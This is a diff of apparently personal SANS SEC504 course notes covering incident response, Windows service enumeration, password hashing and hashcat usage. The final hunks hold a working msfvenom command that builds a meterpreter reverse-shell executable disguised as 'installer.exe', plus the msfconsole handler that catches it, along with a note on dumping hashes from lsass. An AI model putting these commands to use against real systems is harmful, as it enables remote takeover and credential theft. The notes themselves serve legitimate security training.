@@ -13,8 +13,7 @@
 
 Common problems of PICERL
 
-- Poor security hygiene (lack of visibility and
-- threat intelligence)
+- Poor security hygiene (lack of visibility and threat intelligence)
 - Little scoping (if any) leads to incomplete containment
 - Not fixing the vulnerabilities
 - Failure to apply lessons learned
@@ -73,8 +72,16 @@ LocalAddress LocalPort RemoteAddress RemotePort       State Process
 ### Servie Investigation
 
 ```
-PS C:\> Get-CimInstance -ClassName Win32_Service | Select-Object -First 2 * | Format-List Name,Caption,Description,PathName
+PS C:\> Get-CimInstance -ClassName Win32_Service
 
+ProcessId Name                                                   StartMode State   Status ExitCode
+--------- ----                                                   --------- -----   ------ --------
+4784      AdobeARMservice                                        Auto      Running OK     0
+0         AJRouter                                               Manual    Stopped OK     1077
+0         ALG                                                    Manual    Stopped OK     1077
+0         AppIDSvc                                               Manual    Stopped OK     1077
+
+PS C:\> Get-CimInstance -ClassName Win32_Service | Select-Object -First 2 * | Format-List Name,Caption,Description,PathName
 
 Name        : ALG
 Caption     : Application Layer Gateway Service
@@ -765,6 +772,14 @@ legba -U sec504 -P sec504 -T 10.10.75.1 ssh
 
 ## Hashing in Windows
 
+- LANMAN Hashing: Case insensitive, up to 14 characters, encrypted with DES with a leaked key
+- NT Hashes: Case sensitive, no limit in length, encrypted
+
+> NTLM, NTLMv2, and Kerberos all use the NT hash. The LM authentication protocol uses the LM hash.
+
+- For domain user hashing, it can be exported to NTDS.dit, but it is encrypted with SYSTEM hive
+- For modern system, dumping hashing with meterpreter's hashdump, is not working. It must run inside lsass.exe process.
+
 ### LANMAN Hashing
 
 **Even if LANMAN hashing enabled on the host, by its nature, password that is equal or greater than 15 characters in length, will NOT be stored as LANMAN hashing**
@@ -941,7 +956,7 @@ hashcat --identify hashes.txt
 | ?l | abcdefghijklmnopqrstuvwxyz |
 | ?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
 | ?d | 0123456789 |
-| ?s | <SYMBOL> |
+| ?s | <SPACE>!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ |
 | ?a | ?l?u?s?d |
 
 #### Show cracked password history
@@ -949,9 +964,9 @@ hashcat --identify hashes.txt
 Get a list of cracked hashes from a given file using potfile
 
 ```
-$ hashcat -m 0 pass --show
+$ hashcat -m 0 hash_list.txt --show
 861f194e9d6118f3d942a72be3e51749:1234test   <-- Cracked
-$ hashcat -m 0 pass --left
+$ hashcat -m 0 hash_list.txt --left
 60b725f10c9c85c70d97880dfe8191b3            <-- Uncracked
 ```
 
@@ -971,8 +986,7 @@ $ hashcat -m 0 pass --left
 
 ```
 On attacker
-sec504@slingshot:~$ msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform
-windows LHOST=172.16.0.6 LPORT=4444 -o installer.exe
+sec504@slingshot:~$ msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86 --platform windows LHOST=172.16.0.6 LPORT=4444 -o installer.exe
 No encoder or badchars specified, outputting raw payload
 Payload size: 341 bytes
 Final size of exe file: 73802 bytes
@@ -981,8 +995,7 @@ sec504@slingshot:~$ file installer.exe
 installer.exe: PE32 executable (GUI) Intel 80386, for MS Windows
 sec504@slingshot:~$
 sec504@slingshot:~$
-sec504@slingshot:~$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD
-windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"
+sec504@slingshot:~$ msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"
 [*] Starting persistent handler(s)...
 ```
 
